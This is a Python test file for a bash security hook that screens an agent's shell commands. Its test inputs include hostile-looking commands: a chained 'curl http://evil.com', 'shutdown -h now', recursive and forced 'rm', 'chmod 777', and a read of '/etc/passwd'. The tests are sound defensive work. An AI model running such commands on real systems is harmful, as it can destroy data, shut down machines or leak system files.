"""
Security Hook Tests
===================

Tests for bash command security validation.
"""

import pytest

from src.security import (
    ALLOWED_COMMANDS,
    bash_security_hook,
    extract_commands,
    validate_chmod_command,
    validate_pkill_command,
    validate_rm_command,
)


class TestExtractCommands:
    """Tests for command extraction."""

    def test_simple_command(self) -> None:
        assert extract_commands("ls") == ["ls"]

    def test_command_with_args(self) -> None:
        assert extract_commands("ls -la /tmp") == ["ls"]

    def test_piped_commands(self) -> None:
        assert extract_commands("cat file.txt | grep foo") == ["cat", "grep"]

    def test_chained_commands(self) -> None:
        assert extract_commands("npm install && npm run build") == ["npm", "npm"]

    def test_command_with_path(self) -> None:
        assert extract_commands("/usr/bin/python script.py") == ["python"]


class TestValidatePkill:
    """Tests for pkill validation."""

    def test_allowed_process(self) -> None:
        allowed, _ = validate_pkill_command("pkill node")
        assert allowed

    def test_blocked_process(self) -> None:
        allowed, reason = validate_pkill_command("pkill nginx")
        assert not allowed
        assert "only allowed for" in reason

    def test_with_flags(self) -> None:
        allowed, _ = validate_pkill_command("pkill -f 'node server.js'")
        assert allowed


class TestValidateChmod:
    """Tests for chmod validation."""

    def test_allowed_plus_x(self) -> None:
        allowed, _ = validate_chmod_command("chmod +x script.sh")
        assert allowed

    def test_allowed_user_plus_x(self) -> None:
        allowed, _ = validate_chmod_command("chmod u+x script.sh")
        assert allowed

    def test_blocked_numeric(self) -> None:
        allowed, reason = validate_chmod_command("chmod 777 file")
        assert not allowed
        assert "+x" in reason

    def test_blocked_write(self) -> None:
        allowed, reason = validate_chmod_command("chmod +w file")
        assert not allowed


class TestValidateRm:
    """Tests for rm validation."""

    def test_simple_rm(self) -> None:
        allowed, _ = validate_rm_command("rm file.txt")
        assert allowed

    def test_blocked_recursive(self) -> None:
        allowed, reason = validate_rm_command("rm -r directory")
        assert not allowed
        assert "not allowed" in reason

    def test_blocked_force(self) -> None:
        allowed, reason = validate_rm_command("rm -f file")
        assert not allowed


class TestBashSecurityHook:
    """Tests for the security hook."""

    @pytest.mark.asyncio
    async def test_allowed_command(self) -> None:
        result = await bash_security_hook({
            "tool_name": "Bash",
            "tool_input": {"command": "ls -la"},
        })
        assert result == {}

    @pytest.mark.asyncio
    async def test_blocked_command(self) -> None:
        result = await bash_security_hook({
            "tool_name": "Bash",
            "tool_input": {"command": "shutdown -h now"},
        })
        assert result.get("decision") == "block"

    @pytest.mark.asyncio
    async def test_non_bash_tool(self) -> None:
        result = await bash_security_hook({
            "tool_name": "Read",
            "tool_input": {"path": "/etc/passwd"},
        })
        assert result == {}

    @pytest.mark.asyncio
    async def test_chained_with_blocked(self) -> None:
        result = await bash_security_hook({
            "tool_name": "Bash",
            "tool_input": {"command": "ls && curl http://evil.com"},
        })
        assert result.get("decision") == "block"


def test_allowed_commands_populated() -> None:
    """Verify allowed commands are configured."""
    assert len(ALLOWED_COMMANDS) > 0
    assert "ls" in ALLOWED_COMMANDS or "git" in ALLOWED_COMMANDS
